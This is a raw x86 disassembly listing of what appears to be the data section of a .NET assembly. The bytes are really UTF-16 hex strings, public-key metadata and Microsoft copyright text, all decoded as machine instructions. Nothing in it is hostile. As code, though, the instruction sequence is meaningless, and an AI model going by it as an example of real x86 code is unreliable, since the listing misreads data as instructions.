  40348f:	add    BYTE PTR [edx],dh
  403491:	add    BYTE PTR [edx+0x0],ah
  403494:	popa   
  403495:	add    BYTE PTR [esi],dh
  403497:	add    BYTE PTR ds:0x39006200,dh
  40349d:	add    BYTE PTR [edx],dh
  40349f:	add    BYTE PTR [eax],dh
  4034a1:	add    BYTE PTR [ecx],dh
  4034a3:	add    BYTE PTR [eax+eax*1+0x36],ah
  4034a7:	add    BYTE PTR [eax],dh
  4034a9:	add    BYTE PTR ds:0x33003900,dh
  4034af:	add    BYTE PTR [ebp+0x0],ah
  4034b2:	cmp    DWORD PTR [eax],eax
  4034b4:	add    BYTE PTR ss:[ebx+0x0],ah
  4034b8:	xor    al,0x0
  4034ba:	cmp    DWORD PTR [eax],eax
  4034bc:	xor    al,BYTE PTR [eax]
  4034be:	add    BYTE PTR ss:0x65003100,dh
  4034c5:	add    BYTE PTR [eax],bh
  4034c7:	add    BYTE PTR [eax],bh
  4034c9:	add    BYTE PTR [ecx],bh
  4034cb:	add    BYTE PTR [ebx+0x0],ah
  4034ce:	arpl   WORD PTR [eax],ax
  4034d0:	xor    DWORD PTR [eax],eax
  4034d2:	xor    eax,DWORD PTR [eax]
  4034d4:	data16 add BYTE PTR [ecx],dh
  4034d7:	add    BYTE PTR [eax+eax*1],dh
  4034da:	xor    DWORD PTR [eax],eax
  4034dc:	xor    eax,0x62006500
  4034e1:	add    BYTE PTR [edx+0x0],ah
  4034e4:	xor    eax,0x66003300
  4034e9:	add    BYTE PTR [ecx+0x0],ah
  4034ec:	arpl   WORD PTR [eax],ax
  4034ee:	xor    DWORD PTR [eax],eax
  4034f0:	xor    DWORD PTR [eax],eax
  4034f2:	xor    eax,DWORD PTR [eax]
  4034f4:	xor    DWORD PTR [eax],eax
  4034f6:	popa   
  4034f7:	add    BYTE PTR [ebp+0x0],ah
  4034fa:	xor    BYTE PTR [eax],al
  4034fc:	bound  eax,QWORD PTR [eax]
  4034fe:	add    BYTE PTR fs:[ebx],dh
  403501:	add    BYTE PTR [ebx],dh
  403503:	add    BYTE PTR [ebx],dh
  403505:	add    BYTE PTR [ebx+0x0],ah
  403508:	xor    eax,0x65006500
  40350d:	add    BYTE PTR [esi],dh
  40350f:	add    BYTE PTR [eax],dh
  403511:	add    BYTE PTR [edx],dh
  403513:	add    BYTE PTR [ecx],dh
  403515:	add    BYTE PTR [esi],dh
  403517:	add    BYTE PTR [edi],dh
  403519:	add    BYTE PTR [edx],dh
  40351b:	add    BYTE PTR [eax+eax*1+0x39],ah
  40351f:	add    BYTE PTR [edi],dh
  403521:	add    BYTE PTR [ecx],dh
  403523:	add    BYTE PTR [eax],bh
  403525:	add    BYTE PTR [ebp+0x0],ah
  403528:	popa   
  403529:	add    BYTE PTR [ebx],dh
  40352b:	add    BYTE PTR [ecx],dh
  40352d:	add    BYTE PTR [ecx+0x0],ah
  403530:	cmp    BYTE PTR [eax],al
  403532:	popa   
  403533:	add    BYTE PTR [ebp+0x0],ah
  403536:	bound  eax,QWORD PTR [eax]
  403538:	add    BYTE PTR fs:[eax],dh
  40353b:	add    BYTE PTR [eax+eax*1+0x61],ah
  40353f:	add    BYTE PTR [eax],dh
  403541:	add    BYTE PTR [eax],dh
  403543:	add    BYTE PTR [edi],dh
  403545:	add    BYTE PTR [edx],dh
  403547:	add    BYTE PTR [esi+0x0],ah
  40354a:	xor    al,BYTE PTR [eax]
  40354c:	xor    eax,0x38006400
  403551:	add    BYTE PTR [edi],dh
  403553:	add    BYTE PTR [eax+eax*1+0x62],ah
  403557:	add    BYTE PTR [ecx+0x0],ah
  40355a:	add    BYTE PTR ss:[esi+0x0],ah
  40355e:	arpl   WORD PTR [eax],ax
  403560:	cmp    DWORD PTR [eax],eax
  403562:	xor    BYTE PTR [eax],al
  403564:	data16 add BYTE PTR [esi+0x0],ah
  403568:	add    BYTE PTR fs:0x38003900,dh
  40356f:	add    BYTE PTR [ebp+0x0],ah
  403572:	add    BYTE PTR fs:[eax+eax*1],dh
  403576:	add    BYTE PTR fs:[ecx+0x0],ah
  40357a:	xor    eax,DWORD PTR [eax]
  40357c:	xor    eax,0x34006500
  403581:	add    BYTE PTR [eax+eax*1],dh
  403584:	arpl   WORD PTR [eax],ax
  403586:	xor    eax,DWORD PTR [eax]
  403588:	cmp    DWORD PTR [eax],eax
  40358a:	cmp    BYTE PTR [eax],al
  40358c:	arpl   WORD PTR [eax],ax
  40358e:	xor    al,0x0
  403590:	xor    eax,0x33003400
  403595:	add    BYTE PTR [eax],dh
  403597:	add    BYTE PTR [edi],dh
  403599:	add    BYTE PTR [ebp+0x0],ah
  40359c:	cmp    BYTE PTR [eax],al
  40359e:	add    BYTE PTR gs:[ebx],dh
  4035a1:	add    BYTE PTR [ebx],dh
  4035a3:	add    BYTE PTR [edx+0x0],ah
  4035a6:	cmp    BYTE PTR [eax],al
  4035a8:	xor    al,0x0
  4035aa:	xor    al,BYTE PTR [eax]
  4035ac:	add    BYTE PTR ss:[ecx],dh
  4035af:	add    BYTE PTR [eax+eax*1],dh
  4035b2:	xor    eax,DWORD PTR [eax]
  4035b4:	add    BYTE PTR fs:[ecx+0x0],ah
  4035b8:	add    BYTE PTR gs:[ebx+0x0],ah
  4035bc:	cmp    DWORD PTR [eax],eax
  4035be:	data16 add BYTE PTR ds:0x36003900,dh
  4035c5:	add    BYTE PTR [eax],bh
  4035c7:	add    BYTE PTR [ebx],dh
  4035c9:	add    BYTE PTR [esi],dh
  4035cb:	add    BYTE PTR [esi+0x0],ah
  4035ce:	cmp    DWORD PTR [eax],eax
  4035d0:	aaa    
  4035d1:	add    BYTE PTR [ebx+0x0],ah
  4035d4:	cmp    BYTE PTR [eax],al
  4035d6:	data16 add BYTE PTR [edi],dh
  4035d9:	add    BYTE PTR [eax+eax*1],dh
  4035dc:	aaa    
  4035dd:	add    BYTE PTR ds:0x65003000,dh
  4035e3:	add    BYTE PTR ds:0x37003900,dh
  4035e9:	add    BYTE PTR ds:0x36006300,dh
  4035ef:	add    BYTE PTR [eax+eax*1],dh
  4035f2:	add    BYTE PTR gs:[edx],dh
  4035f5:	add    BYTE PTR [ecx],dh
  4035f7:	add    BYTE PTR [eax],bh
  4035f9:	add    BYTE PTR [ecx],bh
  4035fb:	add    BYTE PTR [esi+0x0],ah
  4035fe:	xor    al,0x0
  403600:	xor    eax,0x65006400
  403605:	add    BYTE PTR [esi+0x0],ah
  403608:	xor    al,0x0
  40360a:	add    BYTE PTR ss:[edx+0x0],ah
  40360e:	xor    al,BYTE PTR [eax]
  403610:	popa   
  403611:	add    BYTE PTR [edx],dh
  403613:	add    BYTE PTR [edx+0x0],ah
  403616:	xor    DWORD PTR [eax],eax
  403618:	xor    al,BYTE PTR [eax]
  40361a:	xor    al,0x0
  40361c:	aaa    
  40361d:	add    BYTE PTR [ecx+0x0],ah
  403620:	add    BYTE PTR fs:[ebx+0x0],ah
  403624:	xor    eax,DWORD PTR [eax]
  403626:	add    BYTE PTR ss:0x62003200,dh
  40362d:	add    BYTE PTR [esi+0x0],ah
  403630:	xor    eax,0x33006300
  403635:	add    BYTE PTR [eax],dh
  403637:	add    BYTE PTR [eax],bh
  403639:	add    BYTE PTR [eax],dh
  40363b:	add    BYTE PTR ds:0x64003500,dh
  403641:	add    BYTE PTR [ecx+0x0],ah
  403644:	cmp    DWORD PTR [eax],eax
  403646:	sbb    BYTE PTR [eax+0x20002c],0x50
  40364d:	add    BYTE PTR [ebp+0x0],dh
  403650:	bound  eax,QWORD PTR [eax]
  403652:	ins    BYTE PTR es:[edi],dx
  403653:	add    BYTE PTR [ecx+0x0],ch
  403656:	arpl   WORD PTR [eax],ax
  403658:	dec    ebx
  403659:	add    BYTE PTR [ebp+0x0],ah
  40365c:	jns    0x40365e
  40365e:	cmp    eax,0x30003000
  403663:	add    BYTE PTR [edx],dh
  403665:	add    BYTE PTR [eax+eax*1],dh
  403668:	xor    BYTE PTR [eax],al
  40366a:	xor    BYTE PTR [eax],al
  40366c:	xor    BYTE PTR [eax],al
  40366e:	xor    BYTE PTR [eax],al
  403670:	xor    BYTE PTR [eax],al
  403672:	xor    al,0x0
  403674:	cmp    BYTE PTR [eax],al
  403676:	xor    BYTE PTR [eax],al
  403678:	xor    BYTE PTR [eax],al
  40367a:	xor    BYTE PTR [eax],al
  40367c:	xor    BYTE PTR [eax],al
  40367e:	xor    BYTE PTR [eax],al
  403680:	cmp    DWORD PTR [eax],eax
  403682:	xor    al,0x0
  403684:	xor    BYTE PTR [eax],al
  403686:	xor    BYTE PTR [eax],al
  403688:	xor    BYTE PTR [eax],al
  40368a:	xor    BYTE PTR [eax],al
  40368c:	xor    BYTE PTR [eax],al
  40368e:	xor    BYTE PTR [eax],al
  403690:	xor    BYTE PTR [eax],al
  403692:	add    BYTE PTR ss:[eax],dh
  403695:	add    BYTE PTR [edx],dh
  403697:	add    BYTE PTR [eax],dh
  403699:	add    BYTE PTR [eax],dh
  40369b:	add    BYTE PTR [eax],dh
  40369d:	add    BYTE PTR [eax],dh
  40369f:	add    BYTE PTR [eax],dh
  4036a1:	add    BYTE PTR [eax],dh
  4036a3:	add    BYTE PTR [edx],dh
  4036a5:	add    BYTE PTR [eax+eax*1],dh
  4036a8:	xor    BYTE PTR [eax],al
  4036aa:	xor    BYTE PTR [eax],al
  4036ac:	xor    BYTE PTR [eax],al
  4036ae:	xor    BYTE PTR [eax],al
  4036b0:	xor    eax,0x35003200
  4036b5:	add    BYTE PTR [ebx],dh
  4036b7:	add    BYTE PTR [eax+eax*1],dh
  4036ba:	xor    DWORD PTR [eax],eax
  4036bc:	xor    eax,DWORD PTR [eax]
  4036be:	xor    DWORD PTR [eax],eax
  4036c0:	xor    BYTE PTR [eax],al
  4036c2:	xor    BYTE PTR [eax],al
  4036c4:	xor    BYTE PTR [eax],al
  4036c6:	xor    al,0x0
  4036c8:	xor    BYTE PTR [eax],al
  4036ca:	xor    BYTE PTR [eax],al
  4036cc:	xor    BYTE PTR [eax],al
  4036ce:	xor    BYTE PTR [eax],al
  4036d0:	xor    BYTE PTR [eax],al
  4036d2:	xor    DWORD PTR [eax],eax
  4036d4:	xor    BYTE PTR [eax],al
  4036d6:	xor    BYTE PTR [eax],al
  4036d8:	xor    BYTE PTR [eax],al
  4036da:	xor    DWORD PTR [eax],eax
  4036dc:	xor    BYTE PTR [eax],al
  4036de:	xor    BYTE PTR [eax],al
  4036e0:	xor    DWORD PTR [eax],eax
  4036e2:	cmp    DWORD PTR [eax],eax
  4036e4:	aaa    
  4036e5:	add    BYTE PTR [ebx+0x0],ah
  4036e8:	xor    al,BYTE PTR [eax]
  4036ea:	xor    eax,0x30006400
  4036ef:	add    BYTE PTR [ecx+0x0],ah
  4036f2:	xor    BYTE PTR [eax],al
  4036f4:	xor    al,0x0
  4036f6:	data16 add BYTE PTR [edi],dh
  4036f9:	add    BYTE PTR [ebx],dh
  4036fb:	add    BYTE PTR [ebx+0x0],ah
  4036fe:	bound  eax,QWORD PTR [eax]
  403700:	xor    al,BYTE PTR [eax]
  403702:	aaa    
  403703:	add    BYTE PTR [ecx],dh
  403705:	add    BYTE PTR [ebp+0x0],ah
  403708:	cmp    BYTE PTR [eax],al
  40370a:	xor    DWORD PTR [eax],eax
  40370c:	cmp    BYTE PTR [eax],al
  40370e:	xor    DWORD PTR [eax],eax
  403710:	add    BYTE PTR fs:[edx+0x0],ah
  403714:	popa   
  403715:	add    BYTE PTR [ecx],dh
  403717:	add    BYTE PTR [ebx+0x0],ah
  40371a:	xor    BYTE PTR [eax],al
  40371c:	arpl   WORD PTR [eax],ax
  40371e:	aaa    
  40371f:	add    BYTE PTR [ecx],dh
  403721:	add    BYTE PTR [ebx],dh
  403723:	add    BYTE PTR [eax+eax*1+0x66],ah
  403727:	add    BYTE PTR [eax],bh
  403729:	add    BYTE PTR [eax+eax*1+0x65],ah
  40372d:	add    BYTE PTR [ebp+0x0],ah
  403730:	bound  eax,QWORD PTR [eax]
  403732:	bound  eax,QWORD PTR [eax]
  403734:	xor    al,BYTE PTR [eax]
  403736:	xor    eax,0x36003800
  40373b:	add    BYTE PTR [eax+eax*1],dh
  40373e:	xor    eax,0x31003400
  403743:	add    BYTE PTR [ecx+0x0],ah
  403746:	add    BYTE PTR ss:[esi],dh
  403749:	add    BYTE PTR [esi],dh
  40374b:	add    BYTE PTR [edi],dh
  40374d:	add    BYTE PTR [eax],dh
  40374f:	add    BYTE PTR ds:0x30003000,dh
  403755:	add    BYTE PTR [esi+0x0],ah
  403758:	xor    eax,DWORD PTR [eax]
  40375a:	xor    al,0x0
  40375c:	cmp    BYTE PTR [eax],al
  40375e:	cmp    DWORD PTR [eax],eax
  403760:	add    BYTE PTR ss:[eax+eax*1+0x32],ah
  403765:	add    BYTE PTR [eax],bh
  403767:	add    BYTE PTR [eax],dh
  403769:	add    BYTE PTR [eax+eax*1],dh
  40376c:	cmp    BYTE PTR [eax],al
  40376e:	xor    al,0x0
  403770:	bound  eax,QWORD PTR [eax]
  403772:	xor    al,0x0
  403774:	xor    eax,0x65006600
  403779:	add    BYTE PTR [ecx],dh
  40377b:	add    BYTE PTR [esi+0x0],ah
  40377e:	data16 add BYTE PTR [esi],dh
  403781:	add    BYTE PTR [ebx+0x0],ah
  403784:	xor    al,BYTE PTR [eax]
  403786:	cmp    DWORD PTR [eax],eax
  403788:	data16 add BYTE PTR [edx],dh
  40378b:	add    BYTE PTR [ebp+0x0],ah
  40378e:	add    BYTE PTR gs:[edi],dh
  403791:	add    BYTE PTR [ecx+0x0],ah
  403794:	popa   
  403795:	add    BYTE PTR [ecx],dh
  403797:	add    BYTE PTR [edi],dh
  403799:	add    BYTE PTR ds:0x38006400,dh
  40379f:	add    BYTE PTR [edx+0x0],ah
  4037a2:	arpl   WORD PTR [eax],ax
  4037a4:	bound  eax,QWORD PTR [eax]
  4037a6:	add    BYTE PTR fs:[eax],dh
  4037a9:	add    BYTE PTR [ebx+0x0],ah
  4037ac:	cmp    BYTE PTR [eax],al
  4037ae:	xor    eax,DWORD PTR [eax]
  4037b0:	arpl   WORD PTR [eax],ax
  4037b2:	arpl   WORD PTR [eax],ax
  4037b4:	xor    al,BYTE PTR [eax]
  4037b6:	xor    eax,DWORD PTR [eax]
  4037b8:	cmp    DWORD PTR [eax],eax
  4037ba:	xor    BYTE PTR [eax],al
  4037bc:	xor    DWORD PTR [eax],eax
  4037be:	popa   
  4037bf:	add    BYTE PTR [eax],bh
  4037c1:	add    BYTE PTR [ecx],bh
  4037c3:	add    BYTE PTR [eax+eax*1],dh
  4037c6:	popa   
  4037c7:	add    BYTE PTR [eax],bh
  4037c9:	add    BYTE PTR [esi],dh
  4037cb:	add    BYTE PTR [ecx],bh
  4037cd:	add    BYTE PTR [ecx],bh
  4037cf:	add    BYTE PTR [esi],dh
  4037d1:	add    BYTE PTR [eax],dh
  4037d3:	add    BYTE PTR [ebx],dh
  4037d5:	add    BYTE PTR [eax],dh
  4037d7:	add    BYTE PTR [esi+0x0],ah
  4037da:	add    BYTE PTR ss:[edx],dh
  4037dd:	add    BYTE PTR [ecx],bh
  4037df:	add    BYTE PTR [edx],dh
  4037e1:	add    BYTE PTR [ebx+0x0],ah
  4037e4:	add    BYTE PTR gs:[esi],dh
  4037e7:	add    BYTE PTR [ebp+0x0],ah
  4037ea:	add    BYTE PTR fs:[ecx+0x0],ah
  4037ee:	add    BYTE PTR ss:[ebp+0x0],ah
  4037f2:	add    BYTE PTR ss:[esi+0x0],ah
  4037f6:	xor    eax,DWORD PTR [eax]
  4037f8:	add    BYTE PTR gs:[esi],dh
  4037fb:	add    BYTE PTR [ebx+0x0],ah
  4037fe:	aaa    
  4037ff:	add    BYTE PTR [eax+eax*1],dh
  403802:	bound  eax,QWORD PTR [eax]
  403804:	xor    eax,DWORD PTR [eax]
  403806:	arpl   WORD PTR [eax],ax
  403808:	xor    eax,0x33006100
  40380d:	add    BYTE PTR [eax+eax*1+0x65],ah
  403811:	add    BYTE PTR [eax+eax*1+0x34],ah
  403815:	add    BYTE PTR [ecx],bh
  403817:	add    BYTE PTR [eax],dh
  403819:	add    BYTE PTR [ebx],dh
  40381b:	add    BYTE PTR [ebx+0x0],ah
  40381e:	cmp    DWORD PTR [eax],eax
  403820:	xor    eax,0x65003100
  403825:	add    BYTE PTR [esi],dh
  403827:	add    BYTE PTR [edi],dh
  403829:	add    BYTE PTR [eax+eax*1],dh
  40382c:	aaa    
  40382d:	add    BYTE PTR [ebp+0x0],ah
  403830:	add    BYTE PTR ss:[ecx],dh
  403833:	add    BYTE PTR [eax],dh
  403835:	add    BYTE PTR [edx],dh
  403837:	add    BYTE PTR [ecx],bh
  403839:	add    BYTE PTR [esi],dh
  40383b:	add    BYTE PTR [ecx],bh
  40383d:	add    BYTE PTR ds:0x33003000,dh
  403843:	add    BYTE PTR [ebx],dh
  403845:	add    BYTE PTR [esi],dh
  403847:	add    BYTE PTR [eax],dh
  403849:	add    BYTE PTR [esi+0x0],ah
  40384c:	aaa    
  40384d:	add    BYTE PTR [edi],dh
  40384f:	add    BYTE PTR [eax],bh
  403851:	add    BYTE PTR [ecx],dh
  403853:	add    BYTE PTR [edx+0x0],ah
  403856:	data16 add BYTE PTR [eax],bh
  403859:	add    BYTE PTR [edx+0x0],ah
  40385c:	data16 add BYTE PTR [eax],dh
  40385f:	add    BYTE PTR [ecx],dh
  403861:	add    BYTE PTR ds:0x35003000,dh
  403867:	add    BYTE PTR [eax],bh
  403869:	add    BYTE PTR [ebp+0x0],ah
  40386c:	bound  eax,QWORD PTR [eax]
  40386e:	cmp    BYTE PTR [eax],al
  403870:	cmp    DWORD PTR [eax],eax
  403872:	bound  eax,QWORD PTR [eax]
  403874:	aaa    
  403875:	add    BYTE PTR [esi],dh
  403877:	add    BYTE PTR [edx],dh
  403879:	add    BYTE PTR [ecx],dh
  40387b:	add    BYTE PTR [edi],dh
  40387d:	add    BYTE PTR [ecx],bh
  40387f:	add    BYTE PTR [eax],bh
  403881:	add    BYTE PTR [ebx+0x0],ah
  403884:	arpl   WORD PTR [eax],ax
  403886:	arpl   WORD PTR [eax],ax
  403888:	cmp    BYTE PTR [eax],al
  40388a:	xor    eax,0x61006100
  40388f:	add    BYTE PTR [ebx+0x0],ah
  403892:	popa   
  403893:	add    BYTE PTR [eax],dh
  403895:	add    BYTE PTR [ebx],dh
  403897:	add    BYTE PTR [esi],dh
  403899:	add    BYTE PTR [esi+0x0],ah
  40389c:	data16 add BYTE PTR [ecx],dh
  40389f:	add    BYTE PTR [edx+0x0],ah
  4038a2:	arpl   WORD PTR [eax],ax
  4038a4:	xor    DWORD PTR [eax],eax
  4038a6:	xor    eax,0x36003500
  4038ab:	add    BYTE PTR [edx+0x0],ah
  4038ae:	bound  eax,QWORD PTR [eax]
  4038b0:	aaa    
  4038b1:	add    BYTE PTR [esi+0x0],ah
  4038b4:	add    BYTE PTR ss:[edx],dh
  4038b7:	add    BYTE PTR [eax+eax*1+0x65],ah
  4038bb:	add    BYTE PTR [ecx],dh
  4038bd:	add    BYTE PTR ds:0x30003900,dh
  4038c3:	add    BYTE PTR [eax],bh
  4038c5:	add    BYTE PTR [eax+eax*1],dh
  4038c8:	cmp    BYTE PTR [eax],al
  4038ca:	xor    al,0x0
  4038cc:	cmp    BYTE PTR [eax],al
  4038ce:	cmp    BYTE PTR [eax],al
  4038d0:	add    BYTE PTR ss:[ecx+0x0],ah
  4038d4:	popa   
  4038d5:	add    BYTE PTR [eax],bh
  4038d7:	add    BYTE PTR [edx+0x0],ah
  4038da:	bound  eax,QWORD PTR [eax]
  4038dc:	popa   
  4038dd:	add    BYTE PTR [ebp+0x0],ah
  4038e0:	add    eax,0x120e0100
  4038e5:	sbb    DWORD PTR [eax+eiz*1],eax
  4038e8:	add    DWORD PTR [ecx],eax
  4038ea:	push   cs
  4038eb:	add    eax,0x11010120
  4038f0:	dec    ecx
  4038f1:	add    al,0x20
  4038f3:	add    DWORD PTR [ecx],eax
  4038f5:	or     BYTE PTR [eax+0x2400a0],al
  4038fb:	add    BYTE PTR [eax+eax*4],al
  4038fe:	add    BYTE PTR [eax],al
  403900:	xchg   esp,eax
  403901:	add    BYTE PTR [eax],al
  403903:	add    BYTE PTR [esi],al
  403905:	add    al,BYTE PTR [eax]
  403907:	add    BYTE PTR [eax],al
  403909:	and    al,0x0
  40390b:	add    BYTE PTR [edx+0x53],dl
  40390e:	inc    ecx
  40390f:	xor    DWORD PTR [eax],eax
  403911:	add    al,0x0
  403913:	add    BYTE PTR [ecx],al
  403915:	add    BYTE PTR [ecx],al
  403917:	add    BYTE PTR [ebp+0x2e790fc],dh
  40391d:	jg     0x403986
  40391f:	xchg   DWORD PTR [esi],ebx
  403921:	ja     0x40395d
  403923:	(bad)  
  403924:	fimul  WORD PTR [ecx-0x2be237c8]
  40392a:	add    bh,BYTE PTR [edx+0x1d20b965]
  403930:	pusha  
  403931:	pop    ecx
  403932:	ds xchg esi,eax
  403934:	les    edx,FWORD PTR [edx-0x6377e19b]
  40393a:	sar    DWORD PTR [edi],0x14
  40393d:	adc    eax,0xac3fb5eb
  403942:	adc    DWORD PTR [ecx],esi
  403944:	scas   al,BYTE PTR es:[edi]
  403945:	or     edx,ebx
  403947:	xor    eax,ebp
  403949:	out    dx,al
  40394a:	pusha  
  40394b:	and    DWORD PTR [edi+0x2d],esp
  40394e:	xchg   edi,eax
  40394f:	sbb    dl,ch
  403951:	xor    DWORD PTR [eax-0x5ff24252],ebp
  403957:	pop    es
  403958:	das    
  403959:	and    eax,0x6fba7dd8
  40395e:	leave  
  40395f:	paddw  mm3,QWORD PTR [ecx-0x72]
  403963:	aam    0xda
  403965:	xor    eax,0x8c394ce4
  40396a:	inc    ebp
  40396b:	inc    ebx
  40396c:	pop    es
  40396d:	call   0x26c47555
  403972:	adc    al,0x3d
  403974:	scas   al,BYTE PTR es:[edi]
  403975:	leave  
  403976:	cmc    
  403977:	xchg   esi,eax
  403978:	sub    DWORD PTR [edi-0x69],0xffffffc8
  40397c:	test   DWORD PTR [edi+0x50],0x645c97e5
  403983:	loop   0x40399d
  403985:	lahf   
  403986:	inc    ebp
  403987:	fdivrp st(4),st
  403989:	imul   ebp,DWORD PTR [edx],0x2b
  40398c:	adc    al,BYTE PTR [edi-0x53]
  40398f:	ret    
  403990:	gs sub esi,ebp
  403993:	ret    
  403994:	or     BYTE PTR ds:0x5a95d,al
  40399a:	add    DWORD PTR [ecx],eax
  40399c:	adc    cl,BYTE PTR [ecx]
  40399e:	add    eax,0x1c010220
  4039a3:	sbb    BYTE PTR [esi],al
  4039a5:	add    BYTE PTR [ecx],al
  4039a7:	adc    bl,BYTE PTR [ebp+0x12]
  4039aa:	pop    ebp
  4039ab:	add    al,0x7
  4039ad:	add    DWORD PTR [edx],edx
  4039af:	pop    ebp
  4039b0:	add    eax,DWORD PTR [esi]
  4039b2:	adc    ah,BYTE PTR [ecx+0x3]
  4039b5:	push   es
  4039b6:	adc    ch,BYTE PTR [ecx+0x2]
  4039b9:	sbb    eax,0x200050e
  4039be:	or     BYTE PTR [esi],cl
  4039c0:	push   cs
  4039c1:	add    eax,DWORD PTR [eax]
  4039c3:	add    BYTE PTR [edx],al
  4039c5:	add    eax,0x1111115
  4039ca:	or     BYTE PTR [ebx],al
  4039cc:	and    BYTE PTR [eax],al
  4039ce:	add    al,BYTE PTR [eax+eax*1]
  4039d1:	add    BYTE PTR [edx],dl
  4039d3:	sbb    DWORD PTR [esi],eax
  4039d5:	add    BYTE PTR [edx],al
  4039d7:	or     BYTE PTR [esi],cl
  4039d9:	adc    bh,BYTE PTR [ecx+0x5]
  4039dc:	and    BYTE PTR [ecx],al
  4039de:	add    DWORD PTR [ebx],edx
  4039e0:	add    BYTE PTR [edi],al
  4039e2:	and    BYTE PTR [edx],al
  4039e4:	add    DWORD PTR [ecx],edx
  4039e6:	add    BYTE PTR [ebp+0x100040e],0x1
  4039ed:	push   cs
  4039ee:	add    eax,0x12010120
  4039f3:	pop    ebp
  4039f4:	add    al,0x20
  4039f6:	add    DWORD PTR [ecx],eax
  4039f8:	add    al,BYTE PTR [eax+eiz*1]
  4039fb:	add    BYTE PTR [ebx],dl
  4039fd:	add    BYTE PTR [edx],cl
  4039ff:	and    BYTE PTR [ebx],al
  403a01:	add    DWORD PTR [eax],ecx
  403a03:	adc    al,BYTE PTR [eax-0x6a7fed6b]
  403a09:	adc    eax,0xe0e0a07
  403a0e:	push   cs
  403a0f:	push   cs
  403a10:	adc    al,BYTE PTR [eax-0x7e7fed7f]
  403a16:	adc    al,BYTE PTR [eax-0x6e7fed73]
  403a1c:	sbb    eax,0x6080e
  403a21:	add    DWORD PTR [edx],edx
  403a23:	sbb    BYTE PTR [ecx+0x120040e],0x2
  403a2a:	or     BYTE PTR [eax+eax*1],al
  403a2d:	add    DWORD PTR [ecx],eax
  403a2f:	or     BYTE PTR [esi],al
  403a31:	pop    es
  403a32:	add    cl,BYTE PTR [esi]
  403a34:	adc    al,BYTE PTR [eax+0x1200599]
  403a3a:	add    DWORD PTR [edx],edx
  403a3c:	adc    eax,0x8002003
  403a41:	or     al,0x0
  403a43:	add    edx,DWORD PTR [edx]
  403a45:	xor    BYTE PTR [ecx-0x4a7fedf2],0x11
  403a4c:	cmp    BYTE PTR [ecx+0x1022005],0xe
  403a53:	sbb    al,0x6
  403a55:	pop    es
  403a56:	add    cl,BYTE PTR [eax]
  403a58:	adc    al,BYTE PTR [eax+0x120604b1]
  403a5e:	add    ch,0x6
  403a61:	add    BYTE PTR [ecx],al
  403a63:	add    dl,BYTE PTR [edx]
  403a65:	add    ch,0x4
  403a68:	pop    es
  403a69:	add    DWORD PTR [ecx],edx
  403a6b:	sbb    BYTE PTR [ecx],cl
  403a6d:	add    BYTE PTR [ebx],al
  403a6f:	adc    DWORD PTR [eax+0x120e0ed1],eax
  403a75:	jns    0x403a7d
  403a77:	and    BYTE PTR [edx],al
  403a79:	push   cs
  403a7a:	push   cs
  403a7b:	adc    bh,BYTE PTR [ecx+0x5]
  403a7e:	pop    es
  403a7f:	add    DWORD PTR [ecx],edx
  403a81:	adc    cl,0x12
  403a84:	add    DWORD PTR [eax],eax
  403a86:	or     eax,0x38342e32
  403a8b:	cs xor al,0x37
  403a8e:	cmp    DWORD PTR [edx],esi
  403a90:	cmp    DWORD PTR cs:[ecx+esi*1],esi
  403a94:	add    BYTE PTR [eax],al
  403a96:	and    BYTE PTR [ecx],al
  403a98:	add    BYTE PTR [ebx],bl
  403a9a:	xor    ch,BYTE PTR [esi]
  403a9c:	xor    al,0x38
  403a9e:	cs xor al,0x37
  403aa1:	cmp    DWORD PTR [edx],esi
  403aa3:	cmp    DWORD PTR cs:[ecx+esi*1],esi
  403aa7:	and    BYTE PTR [eax],ch
  403aa9:	push   eax
  403aaa:	push   ecx
  403aab:	sub    eax,0x37315943
  403ab0:	push   ebx
  403ab1:	push   ebp
  403ab2:	xor    BYTE PTR [edi],dh
  403ab4:	sub    DWORD PTR [eax],eax
  403ab6:	add    BYTE PTR [edx],bl
  403ab8:	add    DWORD PTR [eax],eax
  403aba:	adc    eax,0x7263694d
  403abf:	outs   dx,DWORD PTR ds:[esi]
  403ac0:	jae    0x403b31
  403ac2:	data16 je 0x403ae5
  403ac5:	inc    ebx
  403ac6:	outs   dx,DWORD PTR ds:[esi]
  403ac7:	jb     0x403b39
  403ac9:	outs   dx,DWORD PTR ds:[esi]
  403aca:	jb     0x403b2d
  403acc:	je     0x403b37
  403ace:	outs   dx,DWORD PTR ds:[esi]
  403acf:	outs   dx,BYTE PTR ds:[esi]
  403ad0:	add    BYTE PTR [eax],al
  403ad2:	xor    eax,DWORD PTR [ecx]
  403ad4:	add    BYTE PTR [esi],ch
  403ad6:	ret    0x20a9
  403ad9:	dec    ebp
  403ada:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  403ae1:	je     0x403b03
  403ae3:	inc    ebx
  403ae4:	outs   dx,DWORD PTR ds:[esi]
  403ae5:	jb     0x403b57
  403ae7:	outs   dx,DWORD PTR ds:[esi]
  403ae8:	jb     0x403b4b
  403aea:	je     0x403b55
  403aec:	outs   dx,DWORD PTR ds:[esi]
  403aed:	outs   dx,BYTE PTR ds:[esi]
  403aee:	and    BYTE PTR cs:[ecx+0x6c],al
  403af2:	ins    BYTE PTR es:[edi],dx
  403af3:	and    BYTE PTR [edx+0x69],dh
  403af6:	addr16 push 0x72207374
  403afc:	gs jae 0x403b64
  403aff:	jb     0x403b77
  403b01:	gs fs add BYTE PTR cs:[eax],al
  403b06:	add    BYTE PTR [edi-0x7e7fffff],0x4d
  403b0d:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  403b14:	je     0x403b36
  403b16:	popa   
  403b17:	outs   dx,BYTE PTR ds:[esi]
  403b18:	and    BYTE PTR fs:[edi+0x69],dl
  403b1c:	outs   dx,BYTE PTR ds:[esi]
  403b1d:	outs   dx,DWORD PTR fs:[esi]
  403b1f:	ja     0x403b94
  403b21:	and    BYTE PTR [ecx+0x72],ah
  403b24:	and    BYTE PTR gs:[ebp+0x69],ah
  403b28:	je     0x403b92
  403b2a:	gs jb  0x403b4d
  403b2d:	jb     0x403b94
  403b2f:	imul   esi,DWORD PTR [bp+di+0x74],0x64657265
  403b37:	and    BYTE PTR [edx+esi*2+0x61],dh
  403b3b:	fs gs ins DWORD PTR es:[edi],dx
  403b3e:	popa   
  403b3f:	jb     0x403bac
  403b41:	jae    0x403b63
  403b43:	outs   dx,DWORD PTR ds:[esi]
  403b44:	jb     0x403b66
  403b46:	je     0x403bba
  403b48:	popa   
  403b49:	fs gs ins DWORD PTR es:[edi],dx
  403b4c:	popa   
  403b4d:	jb     0x403bba
  403b4f:	jae    0x403b71
